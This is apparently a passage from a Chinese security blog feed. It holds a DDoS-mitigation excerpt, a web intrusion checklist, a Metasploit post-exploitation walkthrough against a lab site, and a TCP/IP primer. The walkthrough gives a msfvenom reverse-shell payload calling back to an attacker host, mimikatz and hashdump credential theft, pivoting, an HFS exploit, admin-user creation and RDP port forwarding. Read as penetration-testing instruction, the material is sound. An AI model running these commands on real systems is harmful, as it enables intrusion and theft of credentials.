名单中，存在则转发到后端。如不存在于白名单中，检查是否是该IP在一定时间段内的首次SYN报文，不是则检查是否重传报文，是重传则转发并加入白名单，不是则丢弃并加入黑名单。是首次SYN报文则丢弃并等待一段时间以试图接受该IP的SYN重传报文，等待超时则判定为攻击报文加入黑名单。</p><p>首包丢弃方案对用户体验会略有影响，因为丢弃首包重传会增大业务的响应时间，有鉴于此发展出了一种更优的TCP Proxy方案。所有的SYN数据报文由清洗设备接受，按照SYN Cookie方案处理。和设备成功建立了TCP三次握手的IP地址被判定为合法用户加入白名单，由设备伪装真实客户端IP地址再与真实服务器完成三次握手，随后转发数据。而指定时间内没有和设备完成三次握手的IP地址，被判定为恶意IP地址屏蔽一定时间。除了SYN Cookie结合TCP Proxy外，清洗设备还具备多种畸形TCP标志位数据包探测的能力，通过对SYN报文返回非预期应答测试客户端反应的方式来鉴别正常访问和恶意行为。</p><p>清洗设备的硬件具有特殊的网络处理器芯片和特别优化的操作系统、TCP/IP协议栈，可以处理非常巨大的流量和SYN队列。</p><h1 id="HTTP-Flood防御"><a href="#HTTP-Flood防御" class="headerlink" title="HTTP Flood防御"></a>HTTP Flood防御</h1><p>HTTP Flood攻击防御主要通过缓存的方式进行，尽量由设备的缓存直接返回结果来保护后端业务。大型的互联网企业，会有庞大的CDN节点缓存内容。</p><p>当高级攻击者穿透缓存时，清洗设备会截获HTTP请求做特殊处理。最简单的方法就是对源IP的HTTP请求频率做统计，高于一定频率的IP地址加入黑名单。这种方法过于简单，容易带来误杀，并且无法屏蔽来自代理服务器的攻击，因此逐渐废止，取而代之的是JavaScript跳转人机识别方案。</p><p>HTTP Flood是由程序模拟HTTP请求，一般来说不会解析服务端返回数据，更不会解析JS之类代码。因此当清洗设备截获到HTTP请求时，返回一段特殊JavaScript代码，正常用户的浏览器会处理并正常跳转不影响使用，而攻击程序会攻击到空处。</p><h1 id="DNS-Flood防御"><a href="#DNS-Flood防御" class="headerlink" title="DNS Flood防御"></a>DNS Flood防御</h1><p>DNS攻击防御也有类似HTTP的防御手段，第一方案是缓存。其次是重发，可以是直接丢弃DNS报文导致UDP层面的请求重发，可以是返回特殊响应强制要求客户端使用TCP协议重发DNS查询请求。</p><p>特殊的，对于授权域DNS的保护，设备会在业务正常时期提取收到的DNS域名列表和ISP DNS IP列表备用，在攻击时，非此列表的请求一律丢弃，大幅降低性能压力。对于域名，实行同样的域名白名单机制，非白名单中的域名解析请求，做丢弃处理。</p><h1 id="慢速连接攻击防御"><a href="#慢速连接攻击防御" class="headerlink" title="慢速连接攻击防御"></a>慢速连接攻击防御</h1><p>Slowloris攻击防御比较简单，主要方案有两个。</p><p>第一个是统计每个TCP连接的时长并计算单位时间内通过的报文数量即可做精确识别。一个TCP连接中，HTTP报文太少和报文太多都是不正常的，过少可能是慢速连接攻击，过多可能是使用HTTP 1.1协议进行的HTTP Flood攻击，在一个TCP连接中发送多个HTTP请求。</p><p>第二个是限制HTTP头部传输的最大许可时间。超过指定时间HTTP Header还没有传输完成，直接判定源IP地址为慢速连接攻击，中断连接并加入黑名单。</p><hr><p>接下来细说一下不同攻击量对应的方法。</p><p>如果超过，&gt;10G 攻击，如果大于10G攻击，软件防护就是扯蛋</p><p>下面记住一句话，防ddos攻击大小于取决于你带宽的大小，与软件没关系。</p><p>国内现在100M带宽一个月就便宜的8000，贵的2万多，1G带宽，8万，10G带宽，80万，你确定要自己防护？</p><p>业务逻辑很很多种，每家都不太一样，</p><p>WEB类型，这个是攻击最多，防护方案更广，可以选择国内，国外，cdn加速等，</p><p>游戏类型，这个必须得放在国内，放国外太卡，掉线，没人玩了</p><p>解决办法就是找第三方防ddos解决商，</p><p>10~50G防护，国内很多机房都可以防护，问题你给的钱够不够idc机房是否给你防护，他们防护示意图：</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fymlf3s9jcj309e08ngln.jpg" alt=""></p><p>机房有一个总带宽，如果你攻击带宽太大就影响他正常客户，他就会找各种借口给你ip屏蔽。</p><p>实际对机房没有什么影响，但是机房就给你ip屏蔽了，这个用于攻击游戏类网站，搞一会一掉线，用户全掉光了，</p><p>具体防护：<a href="https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&amp;mid=208509616&amp;idx=1&amp;sn=b139a0d97db8fae34a9aaf9ac971f804&amp;mpshare=1&amp;scene=1&amp;srcid=1228NCvYTinSSQFUVS0Ut7ua#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&amp;mid=208509616&amp;idx=1&amp;sn=b139a0d97db8fae34a9aaf9ac971f804&amp;mpshare=1&amp;scene=1&amp;srcid=1228NCvYTinSSQFUVS0Ut7ua#rd</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;DDOS攻击是一个世界级难题，并没有解决办法，只能缓解&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;DDoS（Distributed Denial of Service，分布式拒绝服务）攻击的主要目的是让指定目标无法提供正常服务，甚至从互联网上消失，是目前最强大、最难防
      
    
    </summary>
    
      <category term="网络及协议" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/"/>
    
    
  </entry>
  
  <entry>
    <title>Web渗透入侵思路</title>
    <link href="http://yoursite.com/2018/12/28/Web%E6%B8%97%E9%80%8F%E5%85%A5%E4%BE%B5%E6%80%9D%E8%B7%AF/"/>
    <id>http://yoursite.com/2018/12/28/Web渗透入侵思路/</id>
    <published>2018-12-28T07:22:11.000Z</published>
    <updated>2018-12-28T07:25:29.266Z</updated>
    
    <content type="html"><![CDATA[<p>一：查找注入，注意数据库用户权限和站库是否同服。</p><p>二、查找XSS，最近盲打很流行，不管怎样我们的目的是进入后台。</p><p>三、查找上传，一些能上传的页面，比如申请友链、会员头像、和一些敏感页面等等，注意查看验证方式是否能绕过，注意结合服务器的解析特性，比如典型的IIS6.0、Apache等。</p><p>四、查找编辑器，比较典型的ewebeditor、fckeditor等等。</p><p>五、查找phpmyadmin等管理程序，可以尝试弱口令，或者寻找其漏洞。</p><p>六、百度、谷歌搜索程序公开漏洞。</p><p>七、猜解文件，如知道某文件为admin_login.php,我们可尝试admin_add.php、admin_upload.php文件是否存在，也可以谷歌搜索site:cnseay.com inurl:edit等等，很多时候可以找到一些敏感文件，接着看是否验证权限或能否绕过验证，这像冰风说高级语法。</p><p>八、会员注册、修改、删除、评论等一切需要操作数据库的地方记得加单引号之类查看是否存在insert、update等类型注入。</p><p>九、会员或低权限管理登陆后可抓包分析，尝试修改超级管理员密码，权限提升。</p><p>十、通常有下载功能的站我们可以尝试修改下URL文件名，看能否下载站点敏感文件，如数据库配置文件等，数据库不可外连情况下可以尝试数据库密码登陆后台，也可下载上传、登陆验证等文件进行代码审计。</p><p>十一、备份文件和后门，某些主站子目录存在分站，比如<a href="http://www.cnseay.com/seay/，我们可以尝试www.cnseay.com/seay.rar/zip等压缩文件是否存在，可能就是子站的源码。也有一些站类似这样www.cnseay.com/old/，一般都是以前的老站，通常老站会比较容易拿。还有就是数据库备份、前人的后门等，具体这些目录上的东西就要看你的字典了。" target="_blank" rel="noopener">www.cnseay.com/seay/，我们可以尝试www.cnseay.com/seay.rar/zip等压缩文件是否存在，可能就是子站的源码。也有一些站类似这样www.cnseay.com/old/，一般都是以前的老站，通常老站会比较容易拿。还有就是数据库备份、前人的后门等，具体这些目录上的东西就要看你的字典了。</a></p><p>十二、0day漏洞，不管是别人给你的，还是自己挖的，总之好使就行。</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fymhnhgwkbj30m40pkta2.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一：查找注入，注意数据库用户权限和站库是否同服。&lt;/p&gt;
&lt;p&gt;二、查找XSS，最近盲打很流行，不管怎样我们的目的是进入后台。&lt;/p&gt;
&lt;p&gt;三、查找上传，一些能上传的页面，比如申请友链、会员头像、和一些敏感页面等等，注意查看验证方式是否能绕过，注意结合服务器的解析特性，比
      
    
    </summary>
    
      <category term="渗透流程" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>后渗透攻击</title>
    <link href="http://yoursite.com/2018/12/27/%E5%90%8E%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2018/12/27/后渗透攻击/</id>
    <published>2018-12-27T14:35:48.000Z</published>
    <updated>2018-12-27T15:24:55.913Z</updated>
    
    <content type="html"><![CDATA[<h1 id="渗透测试方法论"><a href="#渗透测试方法论" class="headerlink" title="渗透测试方法论"></a>渗透测试方法论</h1><h2 id="前期交互阶段"><a href="#前期交互阶段" class="headerlink" title="前期交互阶段"></a>前期交互阶段</h2><p>在前期交互阶段，渗透测试团队与客户组织进行交互讨论，最重要的是确定渗透测试的范围、目标、限制条件以及服务合同细节。</p><p>该阶段通常涉及收集客户需求、准备测试计划、定义测试范围与边界、定义业务目标、项目管理与规划等活动。</p><h2 id="情报搜集阶段"><a href="#情报搜集阶段" class="headerlink" title="情报搜集阶段"></a>情报搜集阶段</h2><p>渗透测试团队可以利用各种信息来源于搜集技术方法，尝试获取更多关于目标组织网络拓扑、系统配置与安全防御措施的信息。</p><p>收集信息的方法包括公开来源信息查询、Google Hacking、社会工程学、网络踩点、扫描探测、被动监听、服务查点等。</p><h2 id="威胁建模阶段"><a href="#威胁建模阶段" class="headerlink" title="威胁建模阶段"></a>威胁建模阶段</h2><p>针对获取的信息进行威胁建模与攻击规划。通过团队共同的缜密情报分析与攻击思路头脑风暴，可以从大量的信息中理清头绪，切丁最可行的攻击通道。</p><h2 id="漏洞分析阶段"><a href="#漏洞分析阶段" class="headerlink" title="漏洞分析阶段"></a>漏洞分析阶段</h2><p>在确定出最可行的攻击通道之后，接下来需要考虑该如何获取目标系统的访问控制权。</p><p>渗透测试者需要综合分析前几个阶段获取并汇总的情报信息，特别是安全漏洞扫描结果、服务查点信息等，通过搜索可获取的渗透代码资源，找出可以实施渗透攻击的攻击点，并在实验环境中进行验证。</p><p>在该阶段，高水平的渗透测试团队还会针对攻击通道上的一些管家你系统与服务进行安全漏洞探测与挖掘，期望找出可被利用的未知安全漏洞，并开发出渗透代码，从而打开攻击通道上的关键路径。</p><h2 id="渗透攻击阶段"><a href="#渗透攻击阶段" class="headerlink" title="渗透攻击阶段"></a>渗透攻击阶段</h2><p>在此环节中，渗透测试团队需要利用它们所找出的目标系统安全漏洞，来真正入侵系统当中，获得访问控制权。</p><p>渗透测试者还需要充分地考虑目标系统特性来定制渗透攻击，并需要挫败目标网络与系统中实施的安全防御措施，才能成功达成渗透目的。</p><p>在黑盒测试中，渗透测试者还需要考虑对目标系统检测机制的逃逸，从而避免造成目标组织安全响应团队的警觉和发现。</p><h2 id="后渗透攻击阶段"><a href="#后渗透攻击阶段" class="headerlink" title="后渗透攻击阶段"></a>后渗透攻击阶段</h2><p>在这个环节中，需要渗透测试团队根据目标的业务经营模式、保护资产形式与安全防御计划的不同特点，自主设计出攻击目标，识别关键基础设施，并寻找客户最具价值的尝试安全防护的信息和资产，最终达成能够对客户造成最重要业务影响的攻击途径</p><p>后渗透攻击的目标和途径是千变万化的</p><h2 id="报告阶段"><a href="#报告阶段" class="headerlink" title="报告阶段"></a>报告阶段</h2><p>渗透测试过程最终需要向客户提交，取得认可并成功获得合同付款就是一份渗透测试报告。</p><p>这份报告凝聚了之前所有阶段之中渗透测试团队所获取的管家你情报信息、探测和发掘出的系统安全漏洞、成功渗透攻击的过程，以及造成业务影响后果的攻击途径，同时还要站在防御者的角度上，帮助他们分析安全防御体系中的薄弱环节、存在的问题以及修补与升级方案。</p><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="确认目标站点"><a href="#确认目标站点" class="headerlink" title="确认目标站点"></a>确认目标站点</h2><p>使用浏览器打开测试站点<a href="http://www.test.com" target="_blank" rel="noopener">http://www.test.com</a></p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fyloxtot19j30fe07sjry.jpg" alt=""></p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="IP收集"><a href="#IP收集" class="headerlink" title="IP收集"></a>IP收集</h3><p>使用ping 命令初步判定ip 地址为<code>10.10.10.201</code>，但是显示请求超时，目标网站可能有防火墙设置。</p><h3 id="网站技术架构识别"><a href="#网站技术架构识别" class="headerlink" title="网站技术架构识别"></a>网站技术架构识别</h3><p>根据HTTP 报文的响应头部，可以初步判断网站技术架构。</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fylp1hhyd1j30fe02wwer.jpg" alt=""></p><p>通过浏览网站信息，发现该网站使用meinfo，并且他的版本号码是5.0.4。</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fylp1yb6ruj30fe02lq3c.jpg" alt=""></p><h2 id="漏洞分析与利用"><a href="#漏洞分析与利用" class="headerlink" title="漏洞分析与利用"></a>漏洞分析与利用</h2><p>metinfov5.0.4 存在文件上传漏洞，可以直接使用提前写好的脚本GetShell。</p><p>Shell 地址为：</p><p><code>http://www.test.com/upload/file/1544783891.php</code></p><p>输入密码[cmd]，即可进入大马。</p><h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><p>后渗透就是就是扩大渗透攻击的深度与广度。其中涉及到目标系统重要资产发现，权限提升，维持访问等等操作。</p><h3 id="查看开放的端口"><a href="#查看开放的端口" class="headerlink" title="查看开放的端口"></a>查看开放的端口</h3><p>发现Web 服务器上开放的端口如下，</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fylp427o1hj30fe08sdgm.jpg" alt=""></p><p>经过简单判断，得到如下信息</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fylp4nbvzoj30qc03xwee.jpg" alt=""></p><h3 id="用户账户信息"><a href="#用户账户信息" class="headerlink" title="用户账户信息"></a>用户账户信息</h3><p>查看所有账户</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fylp64ne8mj30fe03hgm6.jpg" alt=""></p><p>在这里，我们可以创建一个用户并加入到管理员组，但是我个人觉得意义不大。</p><h3 id="查看IP地址"><a href="#查看IP地址" class="headerlink" title="查看IP地址"></a>查看IP地址</h3><p>在WebShell 中，查看IP 地址发现是[192.168.1.100]，这跟域名解析出来的地址不同。说明Web 服务器有可能在内网中。并且网关是[192.168.1.254]。</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fylp6e3fpej30fe04974r.jpg" alt=""></p><p>这里面我们是没有办法与192.168.1.100 直接进行通信的。我们尝试一下内网能否访问我们。嗯，可以访问，问题不大。</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fylp7eui2pj30fe050aac.jpg" alt=""></p><p>我们可以尝试反弹Shell ，并且使用强大的后渗透工具–Meterpreter。</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h3 id="制作反弹Shell-exe-文件"><a href="#制作反弹Shell-exe-文件" class="headerlink" title="制作反弹Shell exe 文件"></a>制作反弹Shell exe 文件</h3><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.197 LPORT=4444 -f exe -o payload.exe</code></pre><h3 id="配置MSF"><a href="#配置MSF" class="headerlink" title="配置MSF"></a>配置MSF</h3><p>具体命令如下：</p><pre><code>msf &gt; use exploit/multi/handlermsf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(multi/handler) &gt; set LHOST 10.10.10.197LHOST =&gt; 10.10.10.197msf exploit(multi/handler) &gt; exploit</code></pre><p>将生成的payload.exe 文件直接上传到目标服务器，直接运行，就可以得到Meterpreter会话。</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fylp8v5d55j30fe068t95.jpg" alt=""></p><p>这个Meterpreter 会话的ID 是1 ，这个是由payload.exe 文件反弹回来的Shell，如果进程结束，会丢失该会话。</p><h2 id="迁移进程"><a href="#迁移进程" class="headerlink" title="迁移进程"></a>迁移进程</h2><p>通过ps命令查看系统进程</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fylpaf1fr0j30fe050aa7.jpg" alt=""></p><pre><code>migrate 3724</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fylpa2xma2j30fe01hmx9.jpg" alt=""></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p> 我们可以进一步收集Web 服务器192.168.1.100 的相关信息。</p><pre><code>getuid#权限查看systinfo#系统信息ipconfig#网络信息run post/windows/gather/checkvm#是否虚拟机run post/linux/gather/checkvm #是否虚拟机run post/windows/gather/forensics/enum_drives#查看分区run post/windows/gather/enum_applications#获取安装软件信息run post/windows/gather/dumplinks #获取最近的文件操作run post/windows/gather/enum_ie  #获取IE缓存run post/windows/gather/enum_chrome   #获取Chrome缓存run post/windows/gather/enum_patches  #补丁信息run post/windows/gather/enum_domain  #查找域控</code></pre><h3 id="抓取明文密码"><a href="#抓取明文密码" class="headerlink" title="抓取明文密码"></a>抓取明文密码</h3><p>导入mimikatz</p><p>到处密码<code>kerberos</code></p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fylpgds3rnj30fe04zjrj.jpg" alt=""></p><p>我们可以导出目标服务器的用户名和密码[Administrator/123.com]</p><h3 id="远程桌面与截屏"><a href="#远程桌面与截屏" class="headerlink" title="远程桌面与截屏"></a>远程桌面与截屏</h3><pre><code>run vnc</code></pre><p>直接登录目标服务器。</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fylpjfaa1jj30fe0750ta.jpg" alt=""></p><p>还有很多命令如下：</p><pre><code>enumdesktops  #查看可用的桌面getdesktop    #获取当前meterpreter 关联的桌面set_desktop   #设置meterpreter关联的桌面  -h查看帮助screenshot  #截屏use espia  #或者使用espia模块截屏  然后输入screengrabrun vnc  #使用vnc远程桌面连接</code></pre><p> 到此为止，这台服务器已经完全在我们的掌控之中。</p><h2 id="扩大战果"><a href="#扩大战果" class="headerlink" title="扩大战果"></a>扩大战果</h2><h3 id="查看arp-缓存"><a href="#查看arp-缓存" class="headerlink" title="查看arp 缓存"></a>查看arp 缓存</h3><pre><code>arp</code></pre><h3 id="查看路由信息"><a href="#查看路由信息" class="headerlink" title="查看路由信息"></a>查看路由信息</h3><pre><code>route </code></pre><h3 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h3><pre><code>run autoroute -s 192.168.1.0/24</code></pre><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fylpot27gij30fe02laaq.jpg" alt=""></p><h3 id="查看添加的路由信息"><a href="#查看添加的路由信息" class="headerlink" title="查看添加的路由信息"></a>查看添加的路由信息</h3><pre><code>run autoroute -p</code></pre><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>发现目标开启了80 端口</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fylppdfqn1j30fe04xjrn.jpg" alt=""></p><h3 id="版本信息测探"><a href="#版本信息测探" class="headerlink" title="版本信息测探"></a>版本信息测探</h3><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fylppphmjbj30fe04wgm0.jpg" alt=""></p><h2 id="再次渗透攻击"><a href="#再次渗透攻击" class="headerlink" title="再次渗透攻击"></a>再次渗透攻击</h2><p>我们发现[192.168.1.200] 这台机器上80 端口运行着HFS 服务。这个[HFS 2.3 beta]版本存在远程代码执行漏洞。我们可以再次发起渗透攻击。（利用msf）</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fylpsbc813j30fe03rwet.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fylpsi7mbmj30fe055jrq.jpg" alt=""></p><h3 id="切入会话-5"><a href="#切入会话-5" class="headerlink" title="切入会话 5"></a>切入会话 5</h3><pre><code>sessions -i 5</code></pre><h3 id="查看权限"><a href="#查看权限" class="headerlink" title="查看权限"></a>查看权限</h3><pre><code>getuid</code></pre><h3 id="尝试提权"><a href="#尝试提权" class="headerlink" title="尝试提权"></a>尝试提权</h3><pre><code>getsystem</code></pre><h3 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h3><pre><code>migrate 12</code></pre><h3 id="尝试导出账户hash-值"><a href="#尝试导出账户hash-值" class="headerlink" title="尝试导出账户hash 值"></a>尝试导出账户hash 值</h3><pre><code>run hashdump</code></pre><h3 id="查看IP信息"><a href="#查看IP信息" class="headerlink" title="查看IP信息"></a>查看IP信息</h3><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fylpukhhsej30fe036weg.jpg" alt=""></p><h3 id="开启远程桌面连接"><a href="#开启远程桌面连接" class="headerlink" title="开启远程桌面连接"></a>开启远程桌面连接</h3><pre><code>run post/windows/manage/enable_rdp</code></pre><h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><pre><code>net localgroup administrators abc /add</code></pre><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><pre><code>portfwd add -l 33891 -p 3389 -r 127.0.0.1</code></pre><h3 id="远程桌面登录"><a href="#远程桌面登录" class="headerlink" title="远程桌面登录"></a>远程桌面登录</h3><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fylpw6on36j30fe07u3z4.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;渗透测试方法论&quot;&gt;&lt;a href=&quot;#渗透测试方法论&quot; class=&quot;headerlink&quot; title=&quot;渗透测试方法论&quot;&gt;&lt;/a&gt;渗透测试方法论&lt;/h1&gt;&lt;h2 id=&quot;前期交互阶段&quot;&gt;&lt;a href=&quot;#前期交互阶段&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
      <category term="渗透流程" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>TCP/IP</title>
    <link href="http://yoursite.com/2018/12/23/TCP-IP/"/>
    <id>http://yoursite.com/2018/12/23/TCP-IP/</id>
    <published>2018-12-23T07:11:57.000Z</published>
    <updated>2018-12-23T07:58:12.051Z</updated>
    
    <content type="html"><![CDATA[<p>TCP/IP 协议栈是一系列网络协议的总和，是构成网络通信的核心骨架，它定义了电子设备如何连入因特网，以及数据如何在它们之间进行传输。</p><p>TCP/IP采用四层结构，分别是应用层、传输层、网络层和链路层。</p><p>每一层都需要他的下一层所提供的协议来完成自己的需求。</p><p>TCP/IP的工作原理：一个主机的数据要经过哪些过程才能发送到对方的主机上。</p><h1 id="物理介质"><a href="#物理介质" class="headerlink" title="物理介质"></a>物理介质</h1><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fygpaamw92j30i00f6t9b.jpg" alt=""></p><p>当通过http发起一个请求时，应用层、传输层、网络层和链路层的相关协议依次对该请求进行包装并携带对应的首部，最终在链路层生成以太网数据包，以太网数据包通过物理介质传输给对方主机，对方接收到数据包以后，然后再一层一层采用对应的协议进行拆包，最后把应用层数据交给应用程序处理。</p><p>配送车就是物理介质，配送站就是网关， 快递员就是路由器，收货地址就是IP地址，联系方式就是MAC地址。 </p><h1 id="链路层"><a href="#链路层" class="headerlink" title="链路层"></a>链路层</h1><p>网络通信就是把有特定意义的数据通过物理介质传送给对方，单纯的发送0和1是没有意义的，要传输有意义的数据，就需要以字节为单位对 0 和 1 进行分组，并且要标识好每一组电信号的信息特征，然后按照分组的顺序依次发送。以太网规定一组电信号就是一个数据包，一个数据包被称为一帧， 制定这个规则的协议就是以太网协议。</p><p>以太网规协议定，接入网络的设备都必须安装网络适配器，即网卡， 数据包必须是从一块网卡传送到另一块网卡。而网卡地址就是数据包的发送地址和接收地址，也就是帧首部所包含的MAC地址，MAC地址是每块网卡的身份标识，就如同我们身份证上的身份证号码，具有全球唯一性。</p><p>有了MAC地址以后，以太网采用广播形式，把数据包发给该子网内所有主机，子网内每台主机在接收到这个包以后，都会读取首部里的目标MAC地址，然后和自己的MAC地址进行对比，如果相同就做下一步处理，如果不同，就丢弃这个包。</p><p><strong>所以链路层的主要工作就是对电信号进行分组并形成具有特定意义的数据帧，然后以广播的形式通过物理介质发送给接收方。</strong></p><h1 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h1><p>发送者如何知道接收者的MAC地址？ <strong>ARP协议</strong></p><p>发送者如何知道接收者和自己同属一个子网？ <strong>IP协议</strong></p><p>如果接收者和自己不在同一个子网，数据包如何发给对方？ <strong>路由协议</strong></p><h2 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h2><p>MAC地址只与厂商有关，与所处的网络无关，所以无法通过MAC地址来判断两台主机是否属于同一个子网。</p><p>因此，网络层引入了IP协议，制定了一套新地址，使得我们能够区分两台主机是否同属一个网络，这套地址就是网络地址，也就是所谓的IP地址。</p><p>IP地址目前有两个版本，分别是IPv4和IPv6，IPv4是一个32位的地址，常采用4个十进制数字表示。IP协议将这个32位的地址分为两部分，前面部分代表网络地址，后面部分表示该主机在局域网中的地址。为了判断IP地址中的网络地址，IP协议还引入了子网掩码， IP地址和子网掩码通过按位与运算后就可以得到网络地址。</p><p>以C类地址<code>192.168.24.1</code>为例，其中前24位就是网络地址，后8位就是主机地址。<strong>如果两个IP地址在同一个子网内，则网络地址一定相同</strong></p><h2 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h2><p>地址解析协议，是根据IP地址获取MAC地址的一个网络层协议。</p><h3 id="工作原理："><a href="#工作原理：" class="headerlink" title="工作原理："></a>工作原理：</h3><p>ARP首先会发起一个请求数据包，数据包首部包含了目标主机的IP地址，然后这个数据包会在数据链路层进行再次包装，生成以太网数据包，最终由以太网广播给子网内的所有主机，每一台主机都会接收到这个数据包，并取出标头中的IP地址，然后和自己的IP地址进行比较，如果相同就返回自己的MAC地址，如果不同就丢弃该数据包。ARP接收返回信息，以此来确定目标机的MAC地址，与此同时，ARP还会将返回的MAC地址与对应的IP地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。</p><h2 id="路由协议"><a href="#路由协议" class="headerlink" title="路由协议"></a>路由协议</h2><p>通过ARP协议原理可以知道，ARP的MAC寻址局限在同一子网中，因此网络层引入了路由协议，首先通过IP协议来判断两台主机是否在同一子网中，如果在同一子网中就通过ARP协议查询相应的MAC地址，然后以广播的形式向该子网内的主机发送数据包。</p><p>如果不在同一个子网，以太网就会将该数据包转发给本子网的网关进行路由。网关是互联网子网与子网之间的桥梁，所以网关会进行多次转发，最终将数据包转发到目标IP所在的子网中，然后再通过ARP获取目标机MAC，最终也是通过广播形式将数据包发送给对方。</p><p>而完成这个路由协议的物理设备就是路由器，在错综复杂的网络世界里，路由器扮演者交通枢纽的角色，它会根据信道情况，选择并设定路由，以最佳路径来转发数据包。</p><p><strong>网络层的主要工作是定义网络地址，区分网段，子网内MAC寻址，对于不同子网的数据包进行路由。</strong></p><h1 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h1><p>链路层定义了主机的身份，即MAC地址， 而网络层定义了IP地址，明确了主机所在的网段，有了这两个地址，数据包就从可以从一个主机发送到另一台主机。但实际上数据包是从一个主机的某个应用程序发出，然后由对方主机的应用程序接收。而每台电脑都有可能同时运行着很多个应用程序，所以当数据包被发送到主机上以后，是无法确定哪个应用程序要接收这个包。</p><p>因此传输层引入了UDP协议来解决这个问题，为了给每个应用程序标识身份，UDP协议定义了端口，同一个主机上的每个应用程序都需要指定唯一的端口号，并且规定网络中传输的数据包必须加上端口信息。 这样，当数据包到达主机以后，就可以根据端口号找到对应的应用程序了。</p><p>为了保证传输的可靠性，TCP 协议在 UDP 基础之上建立了三次对话的确认机制，也就是说，在正式收发数据前，必须和对方建立可靠的连接。</p><p>TCP 能够保证数据包在传输过程中不被丢失，但美好的事物必然是要付出代价的，相比 UDP，TCP 实现过程复杂，消耗连接资源多，传输速度慢。</p><p><strong>传输层的主要工作是定义端口，标识应用程序身份，实现端口到端口的通信，TCP协议可以保证数据传输的可靠性。</strong></p><h1 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h1><p>理论上讲，有了以上三层协议的支持，数据已经可以从一个主机上的应用程序传输到另一台主机的应用程序了，但此时传过来的数据是字节流，不能很好的被程序识别，操作性差。因此，应用层定义了各种各样的协议来规范数据格式，常见的有 HTTP、FTP、SMTP 等，HTTP 是一种比较常用的应用层协议，主要用于B/S架构之间的数据通信。</p><p>有了这个规范以后，服务端收到请求以后，就能正确的解析客户端发来的数据，当请求处理完以后，再按照客户端要求的格式返回，客户端收到结果后，按照服务端返回的格式进行解析。</p><p><strong>应用层的主要工作就是定义数据格式并按照对应的格式解读数据。</strong></p><h1 id="全流程"><a href="#全流程" class="headerlink" 